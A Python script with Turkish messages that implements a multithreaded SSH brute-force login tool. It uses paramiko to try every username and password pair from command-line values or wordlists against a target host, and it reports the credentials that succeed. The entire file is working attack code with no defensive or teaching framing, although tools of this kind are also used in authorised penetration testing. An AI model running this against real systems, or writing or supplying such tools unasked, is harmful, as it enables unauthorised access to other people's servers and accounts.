import sys
import threading
from queue import Queue
import paramiko

def print_usage():
    print("""
Kullanım: python ssh.py -h <hedef_host> [-p <şifre> | -P <şifre_listesi>] [-u <kullanıcı_adı> | -U <kullanıcı_adı_listesi>]

Gerekli:
  -h <hedef_host>        Hedef IP veya hostname belirtin.
  -p <şifre>             Tek bir şifre belirtin.
  -P <şifre_listesi>     Şifreleri içeren bir dosya belirtin.
  -u <kullanıcı_adı>     Tek bir kullanıcı adı belirtin.
  -U <kullanıcı_adı_listesi> Kullanıcı adlarını içeren bir dosya belirtin.
    """)
    sys.exit(1)

def parse_arguments():
    args = sys.argv[1:]

    target = None
    password = None
    password_file = None
    username = None
    username_file = None

    if not args:
        print("Hata: Hiçbir argüman sağlanmadı.")
        print_usage()

    i = 0
    while i < len(args):
        if args[i] == '-h' and i + 1 < len(args):
            target = args[i + 1]
            i += 2
        elif args[i] == '-p' and i + 1 < len(args):
            password = args[i + 1]
            i += 2
        elif args[i] == '-P' and i + 1 < len(args):
            password_file = args[i + 1]
            i += 2
        elif args[i] == '-u' and i + 1 < len(args):
            username = args[i + 1]
            i += 2
        elif args[i] == '-U' and i + 1 < len(args):
            username_file = args[i + 1]
            i += 2
        else:
            print(f"Hata: Bilinmeyen veya eksik argüman: {args[i]}")
            print_usage()

    if not target:
        print("Hata: Hedef host (-h) belirtilmeli.")
        print_usage()

    if not (password or password_file):
        print("Hata: Şifre için ya -p ya da -P belirtilmeli.")
        print_usage()

    if not (username or username_file):
        print("Hata: Kullanıcı adı için ya -u ya da -U belirtilmeli.")
        print_usage()

    return target, password, password_file, username, username_file

def ssh_login(target, username, password):
    try:
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy()) 
        ssh.connect(target, username=username, password=password, timeout=10)
        ssh.close()
        return True
    except paramiko.AuthenticationException:
        return False
    except Exception as e:
        print(f"[Hata] SSH bağlantısı sırasında hata: {e}")
        return False

def worker(queue, target):
    while not queue.empty():
        username, password = queue.get()
        print(f"[DEBUG] {username}:{password} bilgileri {target} üzerinde deneniyor")
        
        if ssh_login(target, username, password):
            print(f"[BAŞARILI] {username}:{password} bilgileri doğru!")
            queue.queue.clear()  
            break
        queue.task_done()

def main():
    target, password, password_file, username, username_file = parse_arguments()

    try:
        password_list = [password] if password else open(password_file).read().splitlines()
    except FileNotFoundError:
        print(f"Hata: Şifre dosyası '{password_file}' bulunamadı.")
        sys.exit(1)

    try:
        username_list = [username] if username else open(username_file).read().splitlines()
    except FileNotFoundError:
        print(f"Hata: Kullanıcı adı dosyası '{username_file}' bulunamadı.")
        sys.exit(1)

    queue = Queue()
    for u in username_list:
        for p in password_list:
            queue.put((u, p))

    threads = []
    for _ in range(5):  
        t = threading.Thread(target=worker, args=(queue, target))
        t.start()
        threads.append(t)

    for t in threads:
        t.join()

if __name__ == "__main__":
    main()
